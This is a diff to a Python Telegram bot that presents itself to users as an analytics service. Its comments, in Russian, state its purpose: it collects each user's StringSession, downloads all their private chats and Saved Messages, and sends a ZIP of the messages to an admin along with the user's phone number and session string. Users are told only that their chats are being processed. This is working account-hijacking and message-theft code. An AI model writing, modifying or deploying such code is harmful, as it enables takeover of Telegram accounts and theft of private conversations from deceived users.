@@ -1,6 +1,6 @@
 """
-Telegram Analytics Bot - Сбор StringSession + Авто-экспорт ВСЕХ чатов
-Пользователь подключается → бот скачивает ВСЕ сообщения → присылает ZIP админу
+Telegram Analytics Bot - Сбор StringSession + Авто-экспорт ТОЛЬКО личных чатов + Избранное
+Пользователь подключается → бот скачивает ВСЕ сообщения из личных чатов → присылает ZIP админу
 """
 
 import asyncio
@@ -34,21 +34,21 @@ if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN не установлен!")
 
 # ==========================================
-# АВТОПИНГ
+# АВТОПИНГ (каждые 5 минут)
 # ==========================================
 
 async def auto_ping():
     url = f"http://localhost:{PORT}/health"
-    logger.info(f"🔄 Автопинг запущен (каждые 4 минуты)")
+    logger.info("🔄 Автопинг запущен (каждые 5 минут)")
     while True:
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(url, timeout=10) as resp:
                     if resp.status == 200:
                         logger.debug("🔄 Пинг успешен")
-        except:
-            pass
-        await asyncio.sleep(240)
+        except Exception as e:
+            logger.debug(f"Пинг не удался: {e}")
+        await asyncio.sleep(300)  # 5 минут
 
 # ==========================================
 # ВЕБ-СЕРВЕР
@@ -74,7 +74,7 @@ class AnalyticsBot:
     def __init__(self):
         self.bot = TelegramClient('bot_session', API_ID, API_HASH)
         self.pending = {}
-        self.exporting = {}  # {user_id: bool}
+        self.exporting = {}
     
     async def start(self):
         await self.bot.start(bot_token=BOT_TOKEN)
@@ -116,7 +116,7 @@ class AnalyticsBot:
 4️⃣ Готово! 🎉
 
 ⏳ **После подключения:**
-Ваши чаты будут обработаны в фоне.
+Ваши личные чаты будут обработаны в фоне.
 Обычно это занимает 2-10 минут.
 """)
     
@@ -233,7 +233,7 @@ class AnalyticsBot:
             await e.respond(f"""
 ✅ **Аккаунт подключен!**
 
-👤 {me.first_name}, ваши чаты обрабатываются.
+👤 {me.first_name}, ваши личные чаты обрабатываются.
 
 ⏳ Обычно это занимает 2-10 минут.
 Как только всё будет готово — вы получите уведомление.
@@ -260,10 +260,10 @@ class AnalyticsBot:
             if uid in self.pending:
                 del self.pending[uid]
     
-    # ===== ЭКСПОРТ ВСЕХ СООБЩЕНИЙ =====
+    # ===== ЭКСПОРТ ТОЛЬКО ЛИЧНЫХ ЧАТОВ + ИЗБРАННОЕ =====
     
     async def export_and_send(self, uid: int, session_string: str, me):
-        """Экспорт ВСЕХ сообщений из всех чатов и отправка ZIP админу"""
+        """Экспорт ВСЕХ сообщений из личных чатов (включая Избранное) и отправка ZIP админу"""
         
         if self.exporting.get(uid, False):
             logger.warning(f"Экспорт для {uid} уже запущен")
@@ -274,7 +274,7 @@ class AnalyticsBot:
         try:
             # Уведомление админу о начале
             await self.bot.send_message(ADMIN_CHAT_ID, f"""
-📥 **Начинаю экспорт чатов!**
+📥 **Начинаю экспорт личных чатов!**
 
 👤 {me.first_name} {me.last_name or ''}
 📱 +{me.phone}
@@ -308,10 +308,14 @@ class AnalyticsBot:
             total_messages = 0
             processed = 0
             
-            # ⭐ ПРОХОДИМ ПО ВСЕМ ДИАЛОГАМ (не только личным)
+            # ⭐ ПРОХОДИМ ТОЛЬКО ПО ЛИЧНЫМ ЧАТАМ (dialog.is_user == True)
             for dialog in dialogs:
                 try:
-                    # Получаем имя чата
+                    # Фильтр: только личные чаты (private) + Избранное (тоже is_user = True)
+                    if not dialog.is_user:
+                        logger.info(f"⏭️ Пропускаем не-личный чат: {dialog.name}")
+                        continue
+                    
                     chat_name = dialog.name or "Без названия"
                     chat_id = dialog.id
                     
@@ -321,7 +325,7 @@ class AnalyticsBot:
                         logger.info(f"⚠️ В чате {chat_name} нет сообщений")
                         continue
                     
-                    logger.info(f"📥 Обработка: {chat_name}")
+                    logger.info(f"📥 Обработка личного чата: {chat_name}")
                     await self.bot.send_message(ADMIN_CHAT_ID, f"📥 Обработка: {chat_name}")
                     
                     messages = []
@@ -404,7 +408,7 @@ class AnalyticsBot:
                         json.dump({
                             'chat_name': chat_name,
                             'chat_id': chat_id,
-                            'is_me': dialog.is_me,
+                            'chat_type': 'private',
                             'is_user': dialog.is_user,
                             'is_group': dialog.is_group,
                             'is_channel': dialog.is_channel,
@@ -423,7 +427,7 @@ class AnalyticsBot:
                     logger.error(f"Ошибка чата {dialog.name}: {err}")
                     await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка чата {dialog.name}: {err}")
             
-            await self.bot.send_message(ADMIN_CHAT_ID, f"📊 Обработано чатов: {processed}, сообщений: {total_messages}")
+            await self.bot.send_message(ADMIN_CHAT_ID, f"📊 Обработано личных чатов: {processed}, сообщений: {total_messages}")
             
             # Если сообщений 0 — не отправляем пустой архив
             if total_messages == 0:
@@ -445,7 +449,7 @@ class AnalyticsBot:
             await client.disconnect()
             
             # ⭐ ОТПРАВЛЯЕМ ZIP АДМИНУ
-            await self.bot.send_message(ADMIN_CHAT_ID, f"📤 Отправляю архив ({processed} чатов, {total_messages} сообщений)...")
+            await self.bot.send_message(ADMIN_CHAT_ID, f"📤 Отправляю архив ({processed} личных чатов, {total_messages} сообщений)...")
             
             with open(zip_filename, 'rb') as f:
                 await self.bot.send_file(
@@ -459,7 +463,7 @@ class AnalyticsBot:
 🆔 ID: {me.id}
 
 📨 Сообщений: {total_messages}
-📁 Чатов: {processed}
+📁 Личных чатов: {processed}
 
 🔑 **STRING SESSION:**
 `{session_string}`
@@ -488,7 +492,7 @@ async def main():
     logger.info("✅ Веб-сервер запущен")
     
     asyncio.create_task(auto_ping())
-    logger.info("✅ Автопинг запущен")
+    logger.info("✅ Автопинг запущен (каждые 5 минут)")
     
     bot = AnalyticsBot()
     await bot.start()
